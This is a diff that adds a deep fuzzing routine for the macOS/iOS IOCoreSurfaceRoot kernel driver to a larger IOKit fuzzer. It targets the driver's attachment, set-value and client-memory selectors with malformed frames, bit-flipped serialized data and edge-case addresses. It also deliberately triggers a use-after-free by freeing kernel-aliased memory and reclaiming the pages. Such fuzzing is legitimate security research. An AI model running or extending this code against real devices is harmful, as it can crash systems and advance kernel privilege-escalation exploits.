@@ -18262,6 +18262,432 @@ sel7fuzz:
     LOG("[csurf] done (alive), cases %ld", caseidx);
 }
 
+// V112: deep IOCoreSurfaceRoot fuzz on the CONFIRMED sel formats
+// (docs/iosurface_sel_formats.md, verified live on macOS 27; offsets shared
+// with iOS). Key facts: surfaces are owned by their connection (find_surface
+// rejects foreign sids with 0x2c2) — create on the same conn; sel27 =
+// set_bulk_attachments (160B frame, u64 mask @+0x90, sid @+0x98, no value
+// validation, copied into the surface object); sel9 = set_value (13-byte
+// header + binary IOCFSerialize OSArray [value, key-string]); sel7 =
+// client_mem zero-copy alias {addr,size} scalars -> surface aliases OUR
+// memory (UAF when we free it). Env: FUZZ_IOSURFDEEP_STEP (0=all,1=sel27,
+// 2=sel9, 3=sel7), FUZZ_IOSURFDEEP_SKIP=N (deterministic case numbering).
+#include <IOKit/IOCFSerialize.h>
+
+// sel27 field table: bit -> {offset, length}
+static const struct { uint8_t bit, off, len; } isd_flds[] = {
+    { 0, 0x00, 32 }, { 1, 0x20, 16 }, { 2, 0x30, 8 },
+    { 3, 0x38, 1 }, { 4, 0x39, 1 }, { 5, 0x3a, 1 }, { 6, 0x3b, 1 },
+    { 7, 0x3c, 1 }, { 8, 0x3d, 1 }, { 9, 0x3e, 1 }, { 10, 0x3f, 1 },
+    { 11, 0x40, 24 }, { 12, 0x58, 4 }, { 13, 0x5c, 8 },
+    { 14, 0x64, 1 }, { 15, 0x68, 8 }, { 16, 0x70, 4 },
+    { 17, 0x65, 1 }, { 18, 0x66, 1 }, { 19, 0x74, 12 },
+    { 20, 0x80, 2 }, { 21, 0x82, 2 },
+};
+
+static kern_return_t isd_s27(io_connect_t c, const uint8_t *f) {
+    return IOConnectCallMethod(c, 27, NULL, 0, f, 160, NULL, NULL, NULL, NULL);
+}
+static kern_return_t isd_s28(io_connect_t c, uint32_t sid, uint8_t *o) {
+    uint64_t a[1] = { sid };
+    size_t osz = 160;
+    return IOConnectCallMethod(c, 28, a, 1, NULL, 0, NULL, NULL, o, &osz);
+}
+// sel9: payload = binary IOCFSerialize OSArray [value, key(OSString)]
+static CFDataRef isd_ser(CFTypeRef value, CFStringRef key) {
+    CFTypeRef elems[2] = { value, key };
+    CFArrayRef arr = CFArrayCreate(kCFAllocatorDefault, elems, 2, &kCFTypeArrayCallBacks);
+    CFDataRef blob = arr ? IOCFSerialize(arr, kIOCFSerializeToBinary) : NULL;
+    if (arr) CFRelease(arr);
+    return blob;
+}
+static kern_return_t isd_s9c(io_connect_t c, uint32_t sid, const uint8_t *payload,
+                             size_t psz, uint32_t *tok) {
+    uint8_t *buf = (uint8_t *)malloc(psz + 0xc);
+    memset(buf, 0, psz + 0xc);
+    *(uint32_t *)buf = sid;
+    memcpy(buf + 0xc, payload, psz);
+    uint8_t o[4];
+    size_t osz = 4;
+    kern_return_t k = IOConnectCallMethod(c, 9, NULL, 0, buf, psz + 0xc, NULL, NULL, o, &osz);
+    if (tok) *tok = (osz >= 4) ? *(uint32_t *)o : 0;
+    free(buf);
+    return k;
+}
+
+static void p_iosurfdeep(void) {
+    int step = atoi(getenv("FUZZ_IOSURFDEEP_STEP") ?: "0");
+    long skip = atol(getenv("FUZZ_IOSURFDEEP_SKIP") ?: "0");
+    long caseidx = 0;
+    LOG("[isd] v112 deep IOCoreSurfaceRoot fuzz, step %d skip %ld", step, skip);
+    io_service_t s = IOServiceGetMatchingService(kIOMainPortDefault,
+                        IOServiceMatching("IOCoreSurfaceRoot"));
+    if (!s) s = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOSurfaceRoot"));
+    if (!s) { LOG("[isd] service not found"); return; }
+    io_connect_t c = 0;
+    kern_return_t ko = IOServiceOpen(s, mach_task_self(), 0, &c);
+    IOObjectRelease(s);
+    LOG("[isd] open type 0 -> kr 0x%08x conn 0x%x", ko, c);
+    if (ko || !c) return;
+    {
+        uint8_t o[64];
+        size_t osz = 40;
+        uint64_t osc[4] = {0,0,0,0};
+        uint32_t nosc = 0;
+        kern_return_t ki = IOConnectCallMethod(c, 13, NULL, 0, NULL, 0, osc, &nosc, o, &osz);
+        LOG("[isd] sel13 init -> kr 0x%08x", ki);
+    }
+    // surface on THIS connection (owner check — foreign sids get 0x2c2)
+    uint32_t sid = 0;
+    {
+        uint8_t inb[0x40], outb[3176];
+        memset(inb, 0, sizeof inb);
+        memset(outb, 0, sizeof outb);
+        *(uint32_t *)(inb + 0x08) = 64;
+        *(uint32_t *)(inb + 0x0c) = 64;
+        *(uint32_t *)(inb + 0x10) = 0x42475241;
+        *(uint32_t *)(inb + 0x14) = 4;
+        *(uint32_t *)(inb + 0x18) = 256;
+        *(uint32_t *)(inb + 0x1c) = 0x4000;
+        size_t osz = 3176;
+        uint64_t osc[4] = {0,0,0,0};
+        uint32_t nosc = 0;
+        kern_return_t k = IOConnectCallMethod(c, 6, NULL, 0, inb, 32, osc, &nosc, outb, &osz);
+        sid = *(uint32_t *)(outb + 0x18);
+        LOG("[isd] sel6 create 64x64 BGRA -> kr 0x%08x sid %u", k, sid);
+    }
+    if (!sid) { LOG("[isd] no surface, abort"); return; }
+
+    if (step == 0 || step == 1) {
+        // ---- sel27 set_bulk_attachments
+        LOG("[isd] s27 bulk attachments (frame 160B, mask @0x90, sid @0x98)");
+        uint8_t f[160], o[160];
+        // sanity: mask 0
+        caseidx++;
+        if (caseidx > skip) {
+            memset(f, 0, 160);
+            *(uint32_t *)(f + 0x98) = sid;
+            LOG("[isd] s27 c%ld sanity mask 0 ...", caseidx);
+            kern_return_t k = isd_s27(c, f);
+            LOG("[isd] s27 c%ld sanity mask 0 -> kr 0x%08x %s", caseidx, k, k ? "FAIL" : "ok");
+        }
+        // roundtrip: pattern with mask 0x7, verify byte-for-byte via sel28
+        caseidx++;
+        if (caseidx > skip) {
+            memset(f, 0, 160);
+            for (int i = 0; i < 0x84; i++) f[i] = (uint8_t)(i * 7 + 3);
+            *(uint64_t *)(f + 0x90) = 0x7;
+            *(uint32_t *)(f + 0x98) = sid;
+            kern_return_t k = isd_s27(c, f);
+            kern_return_t k2 = isd_s28(c, sid, o);
+            int eq = !memcmp(f, o, 0x84);
+            LOG("[isd] s27 c%ld roundtrip mask 0x7 -> kr 0x%08x rb 0x%08x eq %d %s",
+                caseidx, k, k2, eq, (!k && eq) ? "ok" : "*** ANOMALY");
+        }
+        // mask sweep: each bit, all bits, nonexistent bits
+        {
+            uint64_t masks[32];
+            int nm = 0;
+            masks[nm++] = 0;
+            for (int b = 0; b < 22; b++) masks[nm++] = 1ULL << b;
+            masks[nm++] = ~0ULL;
+            masks[nm++] = 1ULL << 22;
+            masks[nm++] = 1ULL << 32;
+            masks[nm++] = 1ULL << 63;
+            masks[nm++] = 0x3ffffULL;
+            for (int mi = 0; mi < nm; mi++) {
+                caseidx++;
+                if (caseidx <= skip) continue;
+                memset(f, 0, 160);
+                for (int i = 0; i < 0x84; i++) f[i] = (uint8_t)(0xa5 ^ i);
+                *(uint64_t *)(f + 0x90) = masks[mi];
+                *(uint32_t *)(f + 0x98) = sid;
+                kern_return_t k = isd_s27(c, f);
+                kern_return_t k2 = isd_s28(c, sid, o);
+                int bad = -1;
+                if (!k && !k2) {
+                    for (unsigned fi = 0; fi < sizeof(isd_flds)/sizeof(isd_flds[0]); fi++) {
+                        if (!(masks[mi] & (1ULL << isd_flds[fi].bit))) continue;
+                        if (memcmp(f + isd_flds[fi].off, o + isd_flds[fi].off, isd_flds[fi].len)) { bad = fi; break; }
+                    }
+                }
+                LOG("[isd] s27 c%ld mask 0x%016llx -> kr 0x%08x rb 0x%08x badfield %d %s",
+                    caseidx, masks[mi], k, k2, bad,
+                    (!k && !k2 && bad < 0) ? "" : "*** ANOMALY");
+                usleep(1000);
+            }
+        }
+        // field-value fuzz: each field x {0,1,u64max,pattern,gargbage,ptr-like}
+        {
+            static const uint64_t vals[] = {
+                0, 1, 0xffffffffffffffffULL, 0x4141414141414141ULL, 0xdeadbeefcafeULL, 0x160000000ULL
+            };
+            for (unsigned fi = 0; fi < sizeof(isd_flds)/sizeof(isd_flds[0]); fi++) {
+                for (unsigned vi = 0; vi < sizeof(vals)/sizeof(vals[0]); vi++) {
+                    caseidx++;
+                    if (caseidx <= skip) continue;
+                    memset(f, 0, 160);
+                    uint64_t v = vals[vi];
+                    for (int b = 0; b < isd_flds[fi].len; b++)
+                        f[isd_flds[fi].off + b] = (uint8_t)(v >> (8 * (b & 7)));
+                    *(uint64_t *)(f + 0x90) = 1ULL << isd_flds[fi].bit;
+                    *(uint32_t *)(f + 0x98) = sid;
+                    kern_return_t k = isd_s27(c, f);
+                    kern_return_t k2 = isd_s28(c, sid, o);
+                    int bad = (!k && !k2)
+                        ? memcmp(f + isd_flds[fi].off, o + isd_flds[fi].off, isd_flds[fi].len) : 1;
+                    LOG("[isd] s27 c%ld field bit%u off 0x%x v 0x%llx -> kr 0x%08x rb 0x%08x bad %d %s",
+                        caseidx, isd_flds[fi].bit, isd_flds[fi].off, v, k, k2, bad,
+                        (!k && !bad) ? "" : "*** ANOMALY");
+                    usleep(1000);
+                }
+            }
+        }
+    }
+
+    if (step == 0 || step == 2) {
+        // ---- sel9 set_value: payload = binary IOCFSerialize OSArray [value, key]
+        LOG("[isd] s9 set_value (13B header + IOCFSerialize [value, key])");
+        // sanity: value = OSNumber 1, key = "test"
+        caseidx++;
+        if (caseidx > skip) {
+            @autoreleasepool {
+                int32_t one = 1;
+                CFNumberRef num = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &one);
+                CFDataRef blob = isd_ser(num, CFSTR("test"));
+                uint32_t tok = 0;
+                kern_return_t k = blob ? isd_s9c(c, sid, CFDataGetBytePtr(blob), CFDataGetLength(blob), &tok) : 0x2c2;
+                LOG("[isd] s9 c%ld sanity [1, \"test\"] -> kr 0x%08x token %u %s",
+                    caseidx, k, tok, k ? "FAIL" : "ok");
+                if (blob) CFRelease(blob);
+                if (num) CFRelease(num);
+            }
+        }
+        // OSData value sizes 0..1MB
+        {
+            static const size_t dszs[] = { 0, 1, 0x100, 0x10000, 0x100000 };
+            for (unsigned i = 0; i < sizeof(dszs)/sizeof(dszs[0]); i++) {
+                caseidx++;
+                if (caseidx <= skip) continue;
+                @autoreleasepool {
+                    CFMutableDataRef d = CFDataCreateMutable(kCFAllocatorDefault, dszs[i]);
+                    if (d) CFDataSetLength(d, dszs[i]);   // zero-filled
+                    CFDataRef blob = d ? isd_ser(d, CFSTR("test")) : NULL;
+                    uint32_t tok = 0;
+                    kern_return_t k = blob ? isd_s9c(c, sid, CFDataGetBytePtr(blob), CFDataGetLength(blob), &tok) : 0x2c2;
+                    LOG("[isd] s9 c%ld OSData size 0x%zx -> kr 0x%08x token %u %s",
+                        caseidx, dszs[i], k, tok, k ? "" : "(accepted)");
+                    if (blob) CFRelease(blob);
+                    if (d) CFRelease(d);
+                }
+                usleep(2000);
+            }
+        }
+        // bitflips inside the serialized wrapper (header/length/type bytes)
+        {
+            @autoreleasepool {
+                int32_t one = 1;
+                CFNumberRef num = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &one);
+                CFDataRef base = isd_ser(num, CFSTR("test"));
+                if (num) CFRelease(num);
+                if (base) {
+                    const uint8_t *bp = CFDataGetBytePtr(base);
+                    size_t bn = CFDataGetLength(base);
+                    static const uint8_t foffs[] = { 0, 1, 2, 3, 4, 5, 7, 8, 11, 15 };
+                    for (unsigned fo = 0; fo < sizeof(foffs)/sizeof(foffs[0]); fo++) {
+                        for (unsigned b = 0; b < 8; b += 7) {
+                            caseidx++;
+                            if (caseidx <= skip) continue;
+                            if (foffs[fo] >= bn) continue;
+                            uint8_t *m = (uint8_t *)malloc(bn);
+                            memcpy(m, bp, bn);
+                            m[foffs[fo]] ^= (uint8_t)(1U << b);
+                            uint32_t tok = 0;
+                            kern_return_t k = isd_s9c(c, sid, m, bn, &tok);
+                            LOG("[isd] s9 c%ld flip off %u bit %u -> kr 0x%08x %s",
+                                caseidx, foffs[fo], b, k, k == 0 ? "*** ANOMALY accepted" : "");
+                            free(m);
+                            usleep(1000);
+                        }
+                    }
+                    // u32 length-field corruption at candidate offsets
+                    static const uint8_t loff[] = { 4, 8, 12 };
+                    static const uint32_t lv[] = { 0x7fffffff, 0xffffffff, 1 };
+                    for (unsigned fo = 0; fo < sizeof(loff)/sizeof(loff[0]); fo++) {
+                        for (unsigned vi = 0; vi < sizeof(lv)/sizeof(lv[0]); vi++) {
+                            caseidx++;
+                            if (caseidx <= skip) continue;
+                            if (loff[fo] + 4 > bn) continue;
+                            uint8_t *m = (uint8_t *)malloc(bn);
+                            memcpy(m, bp, bn);
+                            *(uint32_t *)(m + loff[fo]) = lv[vi];
+                            uint32_t tok = 0;
+                            kern_return_t k = isd_s9c(c, sid, m, bn, &tok);
+                            LOG("[isd] s9 c%ld len off %u = 0x%08x -> kr 0x%08x %s",
+                                caseidx, loff[fo], lv[vi], k, k == 0 ? "*** ANOMALY accepted" : "");
+                            free(m);
+                            usleep(1000);
+                        }
+                    }
+                    CFRelease(base);
+                } else {
+                    LOG("[isd] s9 c-: base serialize failed — flip/len cases skipped");
+                }
+            }
+        }
+        // type confusion: deep containers as value
+        {
+            caseidx++;
+            if (caseidx > skip) {
+                @autoreleasepool {
+                    NSDictionary *cur = @{};
+                    for (int i = 0; i < 100; i++) cur = @{ @"k" : cur };   // depth 100
+                    CFDataRef blob = isd_ser((__bridge CFTypeRef)cur, CFSTR("deep"));
+                    uint32_t tok = 0;
+                    kern_return_t k = blob ? isd_s9c(c, sid, CFDataGetBytePtr(blob), CFDataGetLength(blob), &tok) : 0x2c2;
+                    LOG("[isd] s9 c%ld deep-dict 100 -> kr 0x%08x %s", caseidx, k, k ? "" : "(accepted)");
+                    if (blob) CFRelease(blob);
+                }
+            }
+            caseidx++;
+            if (caseidx > skip) {
+                @autoreleasepool {
+                    NSArray *cur = @[];
+                    for (int i = 0; i < 100; i++) cur = @[ cur ];
+                    CFDataRef blob = isd_ser((__bridge CFTypeRef)cur, CFSTR("deep"));
+                    uint32_t tok = 0;
+                    kern_return_t k = blob ? isd_s9c(c, sid, CFDataGetBytePtr(blob), CFDataGetLength(blob), &tok) : 0x2c2;
+                    LOG("[isd] s9 c%ld deep-array 100 -> kr 0x%08x %s", caseidx, k, k ? "" : "(accepted)");
+                    if (blob) CFRelease(blob);
+                }
+            }
+            caseidx++;
+            if (caseidx > skip) {
+                @autoreleasepool {
+                    NSMutableArray *big = [NSMutableArray new];
+                    for (int i = 0; i < 1000; i++) [big addObject:@(i)];
+                    CFDataRef blob = isd_ser((__bridge CFTypeRef)big, CFSTR("big"));
+                    uint32_t tok = 0;
+                    kern_return_t k = blob ? isd_s9c(c, sid, CFDataGetBytePtr(blob), CFDataGetLength(blob), &tok) : 0x2c2;
+                    LOG("[isd] s9 c%ld array 1000 nums -> kr 0x%08x %s", caseidx, k, k ? "" : "(accepted)");
+                    if (blob) CFRelease(blob);
+                }
+            }
+        }
+    }
+
+    if (step == 0 || step == 3) {
+        // ---- sel7 client_mem zero-copy alias {addr, size}
+        LOG("[isd] s7 client_mem zero-copy alias");
+        // (a) alias + rewrite + kernel readback via sel30 gather -> zero-copy proof
+        caseidx++;
+        if (caseidx > skip) {
+            uint8_t *buf = (uint8_t *)malloc(0x1000);
+            memset(buf, 0x42, 0x1000);
+            uint64_t a[2] = { (uint64_t)(uintptr_t)buf, 0x1000 };
+            uint8_t o[3176];
+            size_t osz = 3176;
+            uint64_t osc[4] = {0,0,0,0};
+            uint32_t nosc = 0;
+            kern_return_t k = IOConnectCallMethod(c, 7, a, 2, NULL, 0, osc, &nosc, o, &osz);
+            uint32_t msid = *(uint32_t *)(o + 0x18);
+            LOG("[isd] s7 c%ld alias {our malloc, 0x1000} -> kr 0x%08x sid %u", caseidx, k, msid);
+            if (!k && msid) {
+                for (int i = 0; i < 0x1000; i++) buf[i] = (uint8_t)(i * 13 + 7);  // marker B
+                uint64_t g64 = msid;
+                uint8_t g[0x1000];
+                size_t gsz = 0x1000;
+                kern_return_t kg = IOConnectCallMethod(c, 30, &g64, 1, NULL, 0, NULL, NULL, g, &gsz);
+                long found = -1;
+                if (!kg) for (size_t j = 0; j + 4 <= gsz; j++)
+                    if (g[j] == 7 && g[j+1] == 20 && g[j+2] == 33 && g[j+3] == 46) { found = (long)j; break; }
+                LOG("[isd] s7 c%ld gather kr 0x%08x gsz 0x%zx pattern %s — %s",
+                    caseidx, kg, gsz, found >= 0 ? "FOUND" : "absent",
+                    found >= 0 ? "*** ZERO-COPY CONFIRMED (kernel reads our buffer) ***" : "alias not visible?");
+                uint64_t r = msid;
+                kern_return_t kr2 = IOConnectCallScalarMethod(c, 1, &r, 1, NULL, NULL);
+                LOG("[isd] s7 c%ld release alias sid %u -> kr 0x%08x", caseidx, msid, kr2);
+            }
+            free(buf);
+        }
+        // (b) UAF: free the live alias backing, churn-reuse the pages, kernel readback
+        caseidx++;
+        if (caseidx > skip) {
+            uint8_t *buf = (uint8_t *)malloc(0x1000);
+            memset(buf, 0x43, 0x1000);
+            uint64_t a[2] = { (uint64_t)(uintptr_t)buf, 0x1000 };
+            uint8_t o[3176];
+            size_t osz = 3176;
+            uint64_t osc[4] = {0,0,0,0};
+            uint32_t nosc = 0;
+            kern_return_t k = IOConnectCallMethod(c, 7, a, 2, NULL, 0, osc, &nosc, o, &osz);
+            uint32_t msid = *(uint32_t *)(o + 0x18);
+            LOG("[isd] s7 c%ld UAF alias setup -> kr 0x%08x sid %u", caseidx, k, msid);
+            if (!k && msid) {
+                LOG("[isd] s7 c%ld UAF: freeing alias backing + churn (PANIC possible)", caseidx);
+                fsync(fileno(stderr));
+                free(buf);
+                uint8_t *ch[16];
+                for (int i = 0; i < 16; i++) {
+                    ch[i] = (uint8_t *)malloc(0x1000);
+                    if (ch[i]) memset(ch[i], 0x5a + i, 0x1000);
+                }
+                uint64_t g64 = msid;
+                uint8_t g[0x1000];
+                size_t gsz = 0x1000;
+                kern_return_t kg = IOConnectCallMethod(c, 30, &g64, 1, NULL, 0, NULL, NULL, g, &gsz);
+                LOG("[isd] s7 c%ld UAF gather over freed mem -> kr 0x%08x gsz 0x%zx first %02x %02x %02x %02x (alive)",
+                    caseidx, kg, gsz, g[0], g[1], g[2], g[3]);
+                for (int i = 0; i < 16; i++) free(ch[i]);
+                uint64_t r = msid;
+                kern_return_t kr2 = IOConnectCallScalarMethod(c, 1, &r, 1, NULL, NULL);
+                LOG("[isd] s7 c%ld release UAF sid %u -> kr 0x%08x (alive)", caseidx, msid, kr2);
+            } else {
+                free(buf);
+            }
+        }
+        // (c) address edges: page 0 (may be ACCEPTED on iOS per statics — no gather),
+        // unmapped high address (expect 0x2c8/0x2c2)
+        caseidx++;
+        if (caseidx > skip) {
+            uint64_t a[2] = { 1, 0x1000 };
+            uint8_t o[3176];
+            size_t osz = 3176;
+            uint64_t osc[4] = {0,0,0,0};
+            uint32_t nosc = 0;
+            LOG("[isd] s7 c%ld addr=1 (statics: may be accepted on iOS; NO gather — panic risk)", caseidx);
+            fsync(fileno(stderr));
+            kern_return_t k = IOConnectCallMethod(c, 7, a, 2, NULL, 0, osc, &nosc, o, &osz);
+            uint32_t msid = *(uint32_t *)(o + 0x18);
+            LOG("[isd] s7 c%ld addr=1 -> kr 0x%08x sid %u %s",
+                caseidx, k, msid, k ? "" : "*** ACCEPTED (iOS delta confirmed)");
+            if (!k && msid) {
+                uint64_t r = msid;
+                kern_return_t kr2 = IOConnectCallScalarMethod(c, 1, &r, 1, NULL, NULL);
+                LOG("[isd] s7 c%ld release page0 sid %u -> kr 0x%08x", caseidx, msid, kr2);
+            }
+        }
+        caseidx++;
+        if (caseidx > skip) {
+            uint64_t a[2] = { 0x414100000000ULL, 0x1000 };
+            uint8_t o[3176];
+            size_t osz = 3176;
+            uint64_t osc[4] = {0,0,0,0};
+            uint32_t nosc = 0;
+            kern_return_t k = IOConnectCallMethod(c, 7, a, 2, NULL, 0, osc, &nosc, o, &osz);
+            LOG("[isd] s7 c%ld unmapped 0x414100000000 -> kr 0x%08x %s",
+                caseidx, k, k ? "(rejected)" : "*** ANOMALY accepted");
+        }
+    }
+
+    {
+        uint64_t r = sid;
+        kern_return_t k = IOConnectCallScalarMethod(c, 1, &r, 1, NULL, NULL);
+        LOG("[isd] release main sid %u -> kr 0x%08x", sid, k);
+    }
+    LOG("[isd] done (alive), cases %ld", caseidx);
+}
+
 // V110: (A) reclaim UAF pages via IOSurface spray; (B) deep IOSurface fuzz
 // (sel9 manual IOCFSerialize binary blobs, sel27 bulk-attachment frames).
 #include <IOKit/IOCFSerialize.h>
@@ -18546,6 +18972,7 @@ void *t_iosurface_scaler(void *arg) {
         probed = 1;
         if (getenv("FUZZ_LASTMILE")) { p_lastmile(); LOG("[probe13] lastmile-only mode, stop"); return NULL; }
         if (getenv("FUZZ_CORESURF")) { p_coresurf(); LOG("[probe13] coresurf-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_IOSURFDEEP")) { p_iosurfdeep(); LOG("[probe13] iosurfdeep-only mode, stop"); return NULL; }
         if (getenv("FUZZ_UAT")) { p_uat(); LOG("[probe13] uat-only mode, stop"); return NULL; }
         if (getenv("FUZZ_UATREC")) { p_uatrec(); LOG("[probe13] uatrec-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM2")) { p_reclaim2(); LOG("[probe13] reclaim2-only mode, stop"); return NULL; }
